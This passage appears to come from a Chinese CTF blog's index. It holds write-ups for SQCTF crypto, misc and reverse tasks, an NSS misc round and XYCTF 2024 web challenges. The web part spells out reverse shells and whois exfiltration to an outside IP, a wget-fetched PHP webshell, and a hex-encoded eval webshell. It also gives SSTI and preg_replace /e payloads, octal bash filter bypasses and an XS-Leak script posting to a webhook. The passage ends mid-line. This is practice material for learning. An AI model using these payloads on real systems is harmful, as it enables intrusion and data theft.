15124759435262214519214613181859115868729356369274819299240157375966724674496904855757710168853212365134058977781083245051947523020090726851248565503324715984500225724227315777864292625995636236219359256979887906731659848125792269869019299002807101443623257106289957747665586226912446158316961637444556237354422346621287535139897525295200592525427472329815100310702255593134984040293233780616515067333512830391860868933632383433431739823740865023004008736555299772442805617275890761325372253913686933294732259451820332316315205537055439515569011020072762809613676347686279082728000419370190242778504490370698336750029 e = 65537 dp = 1489209342944820124277807386023133257342259912189247976569642906341314682381245025918040456151960704964362424182449567071683886673550031774367531511627163525245627333820636131483140111126703748875380337657189727259902108519674360217456431712478937900720899137512461928967490562092139439552174099755422092113 c = 4689152436960029165116898717604398652474344043493441445967744982389466335259787751381227392896954851765729985316050465252764336561481633355946302884245320441956409091576747510870991924820104833541438795794034004988760446988557417649875106251230110075290880741654335743932601800868983384563972124570013568709773861592975182534005364811768321753047156781579887144279837859232399305581891089040687565462656879173423137388006332763262703723086583056877677285692440970845974310740659178040501642559021104100335838038633269766591727907750043159766170187942739834524072423767132738563238283795671395912593557918090529376173 # 恢复 p for k in range(1, e): p = (e * dp - 1) // k + 1 if n % p == 0: break print(f\u0026#34;Found p: {p}\u0026#34;) # 计算 q 和 φ(n) q = n // p phi = (p - 1) * (q - 1) # 计算私钥 d d = gmpy2.invert(e, phi) # 解密消息 m = pow(c, d, n) print(f\u0026#34;Decrypted message: {long_to_bytes(m)}\u0026#34;) 密室逃脱的终极挑战 字母的轮舞与维吉尼亚的交响曲 维吉尼亚解密然后一眼看到flag得加密字符\n一眼凯撒，随波逐流梭：SQCTF{you_are_win!}\n玩的挺变态啊清茶哥 截图片下面的字符然后谷歌识图,发现是猪圈密码\n找个在线网站直接打\nez_SCA ai一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 import numpy as np # 加载模板轨迹 template_trace_0 = np.load(\u0026#39;template_trace_0.npy\u0026#39;) template_trace_1 = np.load(\u0026#39;template_trace_1.npy\u0026#39;) # 加载能量轨迹 traces = np.load(\u0026#39;energy_traces_with_flag.npy\u0026#39;) def moving_average_filter(trace, window_size=5): \u0026#34;\u0026#34;\u0026#34; 使用移动平均滤波对能量轨迹进行降噪处理。 \u0026#34;\u0026#34;\u0026#34; filtered_trace = np.convolve(trace, np.ones(window_size) / window_size, mode=\u0026#39;valid\u0026#39;) return filtered_trace def compare_trace_with_templates(trace, template_0, template_1): \u0026#34;\u0026#34;\u0026#34; 使用欧氏距离比较能量轨迹与模板轨迹的相似性，返回对应的二进制位（0 或 1）。 \u0026#34;\u0026#34;\u0026#34; # 对能量轨迹进行滤波处理 filtered_trace = moving_average_filter(trace) # 确保滤波后的能量轨迹和模板轨迹的形状一致 min_length = min(len(filtered_trace), len(template_0)) filtered_trace = filtered_trace[:min_length] template_0 = template_0[:min_length] template_1 = template_1[:min_length] # 计算与模板轨迹 0 的欧氏距离 dist_0 = np.linalg.norm(template_0 - filtered_trace) # 计算与模板轨迹 1 的欧氏距离 dist_1 = np.linalg.norm(template_1 - filtered_trace) # 比较距离，选择更小的距离对应的位 if dist_0 \u0026lt; dist_1: return \u0026#39;0\u0026#39; else: return \u0026#39;1\u0026#39; def bits_to_text(bits): \u0026#34;\u0026#34;\u0026#34; 将二进制位转换为文本。 \u0026#34;\u0026#34;\u0026#34; chars = [bits[i:i + 8] for i in range(0, len(bits), 8)] text = \u0026#39;\u0026#39;.join([chr(int(char, 2)) for char in chars]) return text # 初始化存储位的列表 bits = [] # 遍历每个能量轨迹 for trace in traces: bit = compare_trace_with_templates(trace, template_trace_0, template_trace_1) bits.append(bit) # 将列表转换为字符串 bits_str = \u0026#39;\u0026#39;.join(bits) # 转换二进制位为文本 flag = bits_to_text(bits_str) print(\u0026#34;恢复的明文 flag:\u0026#34;, flag) 你的天赋是什么 摩斯密码直接秒\n将%u7b替换成{即可。SQCTF{YOU-HAVE-TALENT}\nCommon Modulus ai梭。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import math from libnum import n2s def extended_gcd(a, b): if b == 0: return (a, 1, 0) else: g, x, y = extended_gcd(b, a % b) return (g, y, x - (a // b) * y) # 题目参数 n = 13650503560233612352420237787159267432351878281073422449253560365809461612884248041710373755322100953953257608601227381211434513766352420535096028618735289379355710140356003114010103377509526452574385251495847301426845768427018504464757671958803807138699056193259160806476941875860254288376872925837127208612702688503022494109785623082365323949385021488106289708499091818714253710552213982060745736652306892896670424179736886691685639988637188591805479432332714690818805432648223229601082431517091667297328748597580733946557364100555781113940729296951594110258088501146224322799560159763097710814171619948719257894889 c1 = 3366500968116867439746769272799247895217647639427183907930755074259056811685671593722389247697636905214269760325119955242254171223875159785479900114989812511815466122321484289407596620307636198001794029251197349257235827433633936216505458557830334779187112907940003978773672225479445837897135907447625387990203145231671233038707457396631770623123809080945314083730185110252441203674945146889165953135351824739866177205127986576305492490242804571570833778440870959816207461376598067538653432472043116027057204385251674574207749241503571444801505084599753550983430739025050926400228758055440679102902069032768081393253 c2 = 7412517103990148893766077090616798338451607394614015195336719617426935439456886251056015216979658274633552687461145491779122378237012106236527924733047395907133190110919550491029113699835260675922948775568027483123730185809123757000207476650934095553899548181163223066438602627597179560789761507989925938512977319770704123979102211869834390476278761480516444396187746843654541476645830961891622999425268855097938496239480682176640906218645450399785130931214581370821403077312842724336393674718200919934701268397883415347122906912693921254353511118129903752832950063164459159991128903683711317348665571285175839274346 e1 = 4217054819 e2 = 2800068527 # 验证指数互质 assert math.gcd(e1, e2) == 1, \u0026#34;e1和e2必须互质\u0026#34; # 扩展欧几里得算法求a和b g, a, b = extended_gcd(e1, e2) # 计算明文 if a \u0026lt; 0: c1_inv = pow(c1, -1, n) part1 = pow(c1_inv, -a, n) else: part1 = pow(c1, a, n) if b \u0026lt; 0: c2_inv = pow(c2, -1, n) part2 = pow(c2_inv, -b, n) else: part2 = pow(c2, b, n) m = (part1 * part2) % n # 转换为字符串 flag = n2s(m) print(\u0026#34;Flag:\u0026#34;, flag.decode()) 《1789年的密文》 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import re table = [4, 2, 11, 8, 9, 12, 3, 6, 10, 14, 1, 5, 7, 13] Ciphertext = \u0026#39;UNEHJPBIUOMAVZ\u0026#39; with open(r\u0026#39;1.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: data = f.read() # 转轮机根据table重新排列 def wheel_decode(data, table): resultList = [] pattern = re.compile(\u0026#39;[A-Z]{26}\u0026#39;) result = pattern.findall(data) for i in table: resultList.append(result[i-1]) return resultList resultList = wheel_decode(data, table) # 根据密文重新排列 def rearrange(List, Ciphertext): resultList = [] for i in range(0, 14): # 修正循环次数为14（对应14个转轮） resultList.append(List[i][List[i].find(Ciphertext[i]):] + List[i][:List[i].find(Ciphertext[i])]) return resultList resultList = rearrange(resultList, Ciphertext) # 选取每一列，列出结果 def rearrange2(List): resultList = [] s = \u0026#39;\u0026#39; for i in range(0, 26): for j in List: s += j[i] resultList.append(s.lower()) # 直接在此处转换为小写[1,2](@ref) s = \u0026#39;\u0026#39; return resultList resultList = rearrange2(resultList) for i in resultList: print(i) 参考：XCTF-crypto\u0026mdash;转轮机加密 - 我是球啊 - 博客园\nmisc Welcome_Sign_in 扫码关注公众号，回复即可，主要这里的！要用中文的!!!\nlove.host binwalk分离然后打开压缩包即可，记得将sqctf改成大写\nez_music1 打开频谱图就可看到\nYuanShen_Start! 音频一放看到密码\n解压后将word转为压缩包，然后解压，在word-media找到图片\n010打开发现铭感数字\n随波逐流梭，然后解密发现是base58编码，然后继续梭，发现是栅栏加密，这是压缩包密码\nSQCTF{Yuan_Shen_Start!}\nreverse 慕然回首，那人却在灯火阑珊处 先反编译\nai梭哈了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import sys from collections import deque # 逆向分析出的迷宫参数 MAZE_WIDTH = 10 MAZE_HEIGHT = 10 WALL_CHAR = 35 # ASCII \u0026#39;#\u0026#39; END_CHAR = 69 # ASCII \u0026#39;E\u0026#39; # 根据逆向代码推断的迷宫结构（需动态分析实际数据） maze = [ [35, 35, 35, 35, 35, 35, 35, 35, 35, 35], [35, 83, 32, 32, 35, 32, 32, 32, 32, 35], # S=起点(1,1) [35, 35, 35, 32, 35, 32, 35, 35, 32, 35], [35, 32, 32, 32, 35, 32, 32, 35, 32, 35], [35, 35, 35, 32, 35, 32, 35, 35, 32, 35], [35, 32, 32, 32, 32, 32, 35, 32, 32, 35], [35, 35, 35, 35, 35, 32, 35, 32, 35, 35], [35, 32, 32, 32, 32, 32, 32, 32, 32, 35], [35, 35, 35, 32, 35, 35, 35, 35, 32, 35], [35, 35, 35, 35, 35, 35, 35, 35, 69, 35] # E=终点(8,8) ] def find_path(): # BFS算法寻找最短路径（网页1/4/8方法综合） directions = {\u0026#39;w\u0026#39;: (-1, 0), \u0026#39;s\u0026#39;: (1, 0), \u0026#39;a\u0026#39;: (0, -1), \u0026#39;d\u0026#39;: (0, 1)} start = (1, 1) # 根据逆向代码推断的起始坐标 end = (8, 8) queue = deque() queue.append((start[0], start[1], \u0026#34;\u0026#34;)) visited = set() while queue: x, y, path = queue.popleft() # 到达终点（网页1的终止条件） if maze[x][y] == END_CHAR: return path # 遍历四个方向（网页8的逆时针顺序：右/下/左/上） for move in [\u0026#39;d\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;w\u0026#39;]: dx, dy = directions[move] nx, ny = x + dx, y + dy # 边界检查（根据逆向代码逻辑） if 0 \u0026lt;= nx \u0026lt; MAZE_HEIGHT and 0 \u0026lt;= ny \u0026lt; MAZE_WIDTH: # 碰撞检测（逆向代码中的35检查） if maze[nx][ny] != WALL_CHAR and (nx, ny) not in visited: visited.add((nx, ny)) queue.append((nx, ny, path + move)) return None # 生成flag（网页4的路径格式要求） if __name__ == \u0026#34;__main__\u0026#34;: path = find_path() if path: print(f\u0026#34;sqctf{{{path}}}\u0026#34;) # 符合逆向代码中flag格式要求 else: print(\u0026#34;No path found!\u0026#34;) 圣人当仁不让 还是照样反编译，然后将main还有vm_execute(将flag的每个字符异或0xAA再+3)喂给ai\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import base64 # 预定义的字符串 Str2 = \u0026#34;/P7sAe/U0s7c1vjb0vjfyt==\u0026#34; # 解码 Str2 decoded_Str2 = base64.b64decode(Str2) print(f\u0026#34;Decoded Str2: {decoded_Str2}\u0026#34;) # 逆向 vm_execute def reverse_vm_execute(input_bytes): result = bytearray(input_bytes) for i in range(len(result)): # 逆向操作：减 2，加 5，XOR 0xAA # 确保字节值在 0 到 255 之间 result[i] = (result[i] + 2) % 256 result[i] = (result[i] - 5) % 256 result[i] ^= 0xAA return bytes(result) # 找到正确的输入 correct_input = reverse_vm_execute(decoded_Str2) print(f\u0026#34;Correct input: {correct_input.decode()}\u0026#34;) flag是SQCTF{easy_re_vm}\nezRe 一样的python反编译\n解码的SQCTF{5ed2be45-2e83-48d2-b631-c088e51ee964}\n鹅鹅鹅，曲项向天歌 跟上面一样，这个代码直接给ai解密即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ciphertext = \u0026#39;itd~tzw_know_sanmenxbZ8\u0026#39; # 分段处理 part1_encrypted = ciphertext[:7] # 前7字符：itd~tzw part2_encrypted = ciphertext[7:20] # 中间13字符：_know_sanmenx part3_encrypted = ciphertext[20:] # 剩余1字符：8 # 逆向操作 part2_part1 = \u0026#39;\u0026#39;.join([chr(ord(c) - 5) for c in part1_encrypted]) part2_part2 = part2_encrypted # 保持原样 part2_part3 = \u0026#39;\u0026#39;.join([chr(ord(c) + 7) for c in part3_encrypted]) # 组合原始 part2 part2 = part2_part1 + part2_part2 + part2_part3 # 生成完整 flag true_flag = f\u0026#39;flag{{{part2}}}\u0026#39; print(true_flag) PWN 浅红欺醉粉，肯信有江梅 nc连接，然后cat /flag\n","date":"2025-04-07T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-sqctf/","title":"2025-sqctf"},{"content":" misc 27262524 拿到一个加密嵌套压缩包，直接爆破\n发现密码是272727，做misc多了，直接敏锐察觉接下来的密码就是文件名重复三次了，写一个脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import os import pyzipper from queue import Queue def extract_zip(zip_path, output_dir): try: basename = os.path.basename(zip_path) filename = os.path.splitext(basename)[0] password = filename * 3 # 密码为文件名重复三次 with pyzipper.AESZipFile(zip_path) as zf: zf.extractall(path=output_dir, pwd=password.encode(\u0026#39;utf-8\u0026#39;)) print(f\u0026#34;[+] 解压成功: {zip_path}\u0026#34;) new_zips = [] for root, _, files in os.walk(output_dir): for file in files: if file.endswith(\u0026#34;.zip\u0026#34;): new_zips.append(os.path.join(root, file)) return new_zips except Exception as e: print(f\u0026#34;[-] 解压失败: {zip_path}, 错误: {str(e)}\u0026#34;) return [] # 其余代码与原始脚本相同 def main(): initial_zip = r\u0026#34;D:\\网安题文件\\27.zip\u0026#34; # 初始ZIP路径 output_dir = r\u0026#34;D:\\网安题文件\u0026#34; # 输出目录 # 确保输出目录存在 os.makedirs(output_dir, exist_ok=True) # 使用队列处理所有ZIP文件（广度优先遍历） processed = set() # 已处理文件集合（避免重复） queue = Queue() queue.put(initial_zip) while not queue.empty(): current_zip = queue.get() if current_zip in processed: continue processed.add(current_zip) # 解压并获取新生成的ZIP文件 new_zips = extract_zip(current_zip, output_dir) for zip_file in new_zips: queue.put(zip_file) print(\u0026#34;[*] 所有ZIP文件已处理完成！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 这里我遇到一个坑，一开始我直接解压显示错误，后面banzip解压可以，但是代码解压也不行，后面了解是加密算法有点坑\n这个加密算法是AES，而我代码一开始是用Python内置的zipfile模块，仅支持传统的 ZipCrypto 加密，后面换成 pyzipper模块就欧克。得到图片\nforemos提取了一张二维码\n直接微信扫码得到flag\nNSSCTF{The_competition_has_so_far_held_26_rounds}\n补充一句，这里的二维码其实反相了，按道理要用\nhttps://uutool.cn/img-color-reverse/\n这个网站恢复，然后再用QR扫，但是微信扫码比较强，直接出。\nJOJO 题目给了一张图片，随波一把梭没用\n丢进010看看\n发现这里把zip文件头50删了，那我们直接加上。然后binwalk分离，得到一个压缩包，里面有一张图片\n然后放随波逐流，发现还藏了压缩包，直接binwalk分离。然后发现是个加密压缩包，而且看起来像伪加密，但是其实不是。所以要找密码，爆破爆不出，那就是藏在哪里了。\n这张图片放随波逐流时发现crc不对\n想到可能宽高不对劲，用模板改一下宽高（快捷键Alt+4）\n高改成1800就可以看到密码：DarkWill（有些题可以到字符但是乱码，就要爆破宽了）\n解压是txt，里面是一大串字符，那不用想就是套娃\n一眼base16编码\n解码以后一眼凯撒加密，偏移量慢慢试，不想试可以取前面一小段放到随波梭哈看看偏移量\n解密后一样base64转图片（注意去掉前面的world），然后丢随波逐流，发现有zip，然后又分离得到一个压缩包\n一眼伪加密，09改成00后打开，flag就在里面\n总结：此题套娃，出题人接受拷打，难点：出题人防随波逐流，比如第一个要补全压缩包，要利用模板！第二个难点就是补全图片宽高，需要比较敏感。题目知识点不难，但是很难一下想到，还是要多用模板！下班。\n东北jail ","date":"2025-03-31T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nss-round29-misc/","title":"2025-nss-round29-misc"},{"content":" web ezhttp 查看源码有提示\n敏锐的感觉robots.txt有东西\n直接看txt文件就好，拿到账户密码。\n根据响应改一下referer\n改代理\n最后显示要本地用户，直接打X-Forwarded-For: 127.0.0.1\n但是看响应，这个xff应该是被禁用了，打Client-IP: 127.0.0.1。常用的头有\n1 2 3 4 5 6 7 8 9 10 X-Forwarded-For:127.0.0.1 Client-ip:127.0.0.1 X-Client-IP:127.0.0.1 X-Remote-IP:127.0.0.1 X-Rriginating-IP:127.0.0.1 X-Remote-addr:127.0.0.1 HTTP_CLIENT_IP:127.0.0.1 X-Real-IP:127.0.0.1 X-Originating-IP:127.0.0.1 via:127.0.0.1 这里好像只能打Client-IP: 127.0.0.1，逆天\n显然是要加代理服务器-Via，Via: ymzx.qq.com（User-Agents是用户代理）\n这里饼干，显然是cookie，加上XYCTF，即可拿flag\n综合payload\n1 2 3 4 5 Referer: yuanshen.com User Agent: XYCTF Client-IP: 127.0.0.1 Via: ymzx.qq.com Cookie: XYCTF ezmd5 上传2张不同的图片时areEqual:true,md5Equal:false\n上传2张相同图片时恰恰相反\n所以可以猜测，应该只要符合两个都是true就可以拿flag，也就是说要找到2张md5值相同的图片。想必大家肯定做过字符的md5强比较，用fastcoll来完成，其实fastcoll也可以碰撞生成图片，操作就是将图片放到fastcoll就会生成2张MD5值相同的图片\n使用fastcoll生成字符串MD5碰撞-CSDN博客\n工具下载: https://github.com/iamjazz/Md5collision\nwarm up 都是弱比较，直接打payload了\n1 val1[]=1\u0026amp;val2[]=2\u0026amp;md5=0e215962017\u0026amp;XY=0e215962017\u0026amp;XYCTF=0e215962017 (0e215962017MD5加密也是0e开头，0e开头的字符会被php处理为0，非数字字符与数字字符比较也会处理为0，但是非数字与非数字比较不会）注意这里有extract($_GET)变量覆盖，所以可以重新给XYCTF赋值\n拿到下一关路由\n这里post提交的a用数组绕过preg_match,即a[]=1(intval中传入数组时，会判断数组中的是否存在元素，有则返回1，否则返回0，preg_match当检测的变量是数组的时候会报错并返回0)\n下面的preg_replace的考法看下文\nCTF-WEB：攻防世界 ics-05(preg_replace() 函数 /e 漏洞) - 乌漆WhiteMoon - 博客园\nPHP preg_replace() 函数 | 菜鸟教程\n所以这里get传a=/1/e\u0026amp;b=system('cat /flag')\u0026amp;c=1,post传a[]=1\nezMake 非预期 直接dirsearch扫一下直接出来/flag，flag就在里面\n还有大佬发现eval没过滤，直接打马\n1 echo \u0026#39;\u0026lt;?=eval(hex2bin(\u0026#34;6576616c28245f504f53545b22636d64225d293b\u0026#34;))?\u0026gt;\u0026#39; \u0026gt; 1.php #字符解码是$_POST[\u0026#34;cmd\u0026#34;]; 预期解 makefile怎么读取文件内容 - 问答 - 亿速云\n1 2 content := $(shell cat flag) echo $(shell cat flag)\t#试了试其实$(shell cat flag)\t就行 Makefile中使用的是GNU Make的语法。\nez?Make 解法一：nc反弹shell 1 nc 101.200.39.193 5000 -e sh 打反弹shell（bash被禁用了）\n解法二-考命令执行功底 上题的eval被禁用了，f l a g @ $ * ? / 也被过滤，还过滤许多命令执行的方法，测试一些下，more还可以用。所以有\n1 cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;more [0-z][0-z][0-z][0-z]\t#匹配符绕过过滤的flag 官方wp是\n1 cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd bin\u0026amp;\u0026amp;echo \u0026#34;Y2F0IC9mbGFn\u0026#34;|b[!b-z]se64 -d|b[!b-z]sh#匹配符绕过原型base64 -d|bash 这两个有异曲同工之妙，就是进入到bin目录里面，然后执行命令cat /flag。找时间要总结一个命令执行的字典\nεZ?¿м@Kε¿? 进入页面右键有源码提示，然后进入路由\n尝试一下，发现竟然是白名单,在makefile我们怎么只用这几个字符构造命令，看看下文\nMakefile的编写及四个特殊符号的意义@、$@、$^、$ - 春风一郎 - 博客园\n1 2 3 4 5 $@ --代表目标文件(target) $^ --代表所有的依赖文件(components) $\u0026lt; --代表第一个依赖文件(components中最左边的那个)。 尝试发现$\u0026lt;就是flag，也就是说这个时候怎么读取它了，从上面的文章我我们又知道\n1 2 3 4 5 \u0026#39; $ \u0026#39;符号的使用 美元符号$，主要扩展打开makefile中定义的变量 \u0026#39; $$ \u0026#39;符号的使用 $$ 符号主要扩展打开makefile中定义的shell变量 1 2 \u0026lt;符号用于重定向输入，即将命令的输入从一个文件中读取,而不是从标准输入（键盘） \u0026gt;符号用于重定向输出，即将命令的输出写入一个文件，而不是在屏幕上显示 然后打$$(\u0026lt;$\u0026lt;),就是执行shell命令-即执行\u0026lt;读取/flag内容\n我是一个复读机 提示用户名admin,直接跑字典，拿到密码asdqwe，感觉像是ssti，跑跑字典\n逆天，{{和{%禁用，打啥，但是看看题目，叫我输入英文字符，输中文的字符发现其中间的就可以正常进行ssti，不出意外是中文字符被替换成了{{}}。\n这里主要是_ [] ' \u0026quot; os被过滤（还一些关键词），ctfshow的原题\n很多解法，我的解法是：request+cookie\n1 的(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()的 1 a=__globals__;b=os;c=cat /flag request+get也行\n1 的(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()的\u0026amp;a=__globals__\u0026amp;c=cat%20/flag\u0026amp;b=os 牢牢记住，逝者为大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); function Kobe($cmd) { if (strlen($cmd) \u0026gt; 13) { die(\u0026#34;see you again~\u0026#34;); } if (preg_match(\u0026#34;/echo|exec|eval|system|fputs|\\.|\\/|\\\\|/i\u0026#34;, $cmd)) { die(\u0026#34;肘死你\u0026#34;); } foreach ($_GET as $val_name =\u0026gt; $val_val) { if (preg_match(\u0026#34;/bin|mv|cp|ls|\\||f|a|l|\\?|\\*|\\\u0026gt;/i\u0026#34;, $val_val)) { return \u0026#34;what can i say\u0026#34;; }#检查 $_GET 参数中是否包含某些特定的字符串（如 bin、mv、cp、ls 等）或特殊字符（如 |、\u0026gt;、* 等 } return $cmd; } $cmd = Kobe($_GET[\u0026#39;cmd\u0026#39;]); echo \u0026#34;#man,\u0026#34; . $cmd . \u0026#34;,manba out\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; eval(\u0026#34;#man,\u0026#34; . $cmd . \u0026#34;,mamba out\u0026#34;); #man,,manba out 这里限制了不能超过13个字符，我们需要%0a截断#man的干扰，用%23注释掉\u0026quot;,manba out\u0026quot;，只剩11个字符，所以这里只能打\n1 `$_GET[1]`; 这里刚好11个字符（要执行的是PHP代码，因此需要分号；）接下来就是给1传参了\n姿势一：wget 在我们的vps写一个马，然后利用wget下载到当前目录，然后执行就行\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=wget 101.200.39.193:3000/kh.php 姿势二：nc反弹 bin被过滤那就拼接绕过\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=nc 101.200.39.193 5000 -e /b\u0026#39;\u0026#39;in/sh 其实可以更简单一点,这里连/都不需要\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=nc 101.200.39.193 5000 -e sh 姿势三-cp命令执行 1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=c\u0026#39;\u0026#39;p /[@-z][@-z][@-z]g 1.txt 姿势四-whois反弹 这个whois反弹的shell只能执行后面带的命令，所以直接打\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=whois -h 101.200.39.193 -p 5000 `more /[b-z][b-z][@-z][b-z]` ezRCE 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php highlight_file(__FILE__); function waf($cmd){ $white_list = [\u0026#39;0\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;8\u0026#39;,\u0026#39;9\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;$\u0026#39;,\u0026#39;\u0026lt;\u0026#39;]; $cmd_char = str_split($cmd); foreach($cmd_char as $char){ if (!in_array($char, $white_list)){ die(\u0026#34;really ez?\u0026#34;); } } return $cmd; } $cmd=waf($_GET[\u0026#34;cmd\u0026#34;]); system($cmd); 【bashfuck】bashshell无字母命令执行原理 - FreeBuf网络安全行业门户\n02.利用shell脚本变量构造无字母数字命令 · 个人知识库\nLunix可以用$'\\xxx'的方式执行命令，xxx是字符ascii码的八进制形式，当我尝试$'\\154\\163'（ls）是有响应，但是执行$'154\\163\\40\\57'不行，原因上面文章也有，简单来说就是其直接将单引号包裹的内容整体当成了一个命令，不能直接利用。\n然后接下来这里我们想到bash里的一种语法：command [args] \u0026lt;\u0026lt;\u0026lt;[\u0026quot;]$word[\u0026quot;]，在这种语法下$word会展开并作为command的stdin，以此来继续执行命令，但是字母不可以用，这里有两个办法绕过。\n解法一：bash也转换为8进制 1 ?cmd=$\u0026#39;\\142\\141\\163\\150\u0026#39;\u0026lt;\u0026lt;\u0026lt;$\u0026#39;\\154\\163\\40\\57\u0026#39;\t#ls / 1 ?cmd=$\u0026#39;\\142\\141\\163\\150\u0026#39;\u0026lt;\u0026lt;\u0026lt;$\u0026#39;\\143\\141\\164\\40\\57\\146\\154\\141\\147\u0026#39; #cat /flag 解法二：环境变量$0代替bash 1 ?cmd=$0\u0026lt;\u0026lt;\u0026lt;$\u0026#39;\\143\\141\\164\\40\\57\\146\\154\\141\\147\u0026#39; #cat /flag ezPOP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class AAA { public $s; public $a; public function __toString() { echo \u0026#34;you get 2 A \u0026lt;br\u0026gt;\u0026#34;; $p = $this-\u0026gt;a; return $this-\u0026gt;s-\u0026gt;$p; } } class BBB { public $c; public $d; public function __get($name) { echo \u0026#34;you get 2 B \u0026lt;br\u0026gt;\u0026#34;; $a=$_POST[\u0026#39;a\u0026#39;]; $b=$_POST; $c=$this-\u0026gt;c; $d=$this-\u0026gt;d; if (isset($b[\u0026#39;a\u0026#39;])) { unset($b[\u0026#39;a\u0026#39;]); } call_user_func($a,$b)($c)($d); } } class CCC { public $c; public function __destruct() { echo \u0026#34;you get 2 C \u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;c; } } if(isset($_GET[\u0026#39;xy\u0026#39;])) { $a = unserialize($_GET[\u0026#39;xy\u0026#39;]); throw new Exception(\u0026#34;noooooob!!!\u0026#34;); } ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2024-xyctf-web-%E5%A4%8D%E7%8E%B0/","title":"2024-xyctf-web-复现"},{"content":"web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script\u0026gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(\u0026#39;script\u0026#39;) // 创建\u0026lt;script\u0026gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =\u0026gt; { // 脚本加载成功时触发 fetch(\u0026#34;http://yourwebhook/?flag=\u0026#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =\u0026gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-}\u0026#39; // 猜测字符范围（包含闭合符}） let flag = \u0026#39;flag{\u0026#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i \u0026lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } \u0026lt;/script\u0026gt; 每次运行爆出一位，然后手动在let flag = \u0026lsquo;flag{\u0026lsquo;后加上即可\n文章 - 浅谈XS-Leaks之Timeless timing attck - 先知社区\nsqlmap-master 先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from fastapi import FastAPI, Request # 导入FastAPI框架及请求对象 from fastapi.responses import FileResponse, StreamingResponse # 导入文件响应和流式响应类 import subprocess # 用于执行系统命令 app = FastAPI() # 创建FastAPI应用实例 @app.get(\u0026#34;/\u0026#34;) # 定义根路径的GET路由 async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) # 返回静态文件index.html（前端页面） @app.post(\u0026#34;/run\u0026#34;) # 定义/run路径的POST路由 async def run(request: Request): # 接收请求对象 data = await request.json() # 异步获取请求的JSON数据 url = data.get(\u0026#34;url\u0026#34;) # 从数据中提取url参数 if not url: # 校验url参数是否存在 return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} # 返回错误信息 # 构建sqlmap命令（存在安全风险！见下方警告） command = f\u0026#39;sqlmap -u {url} --batch 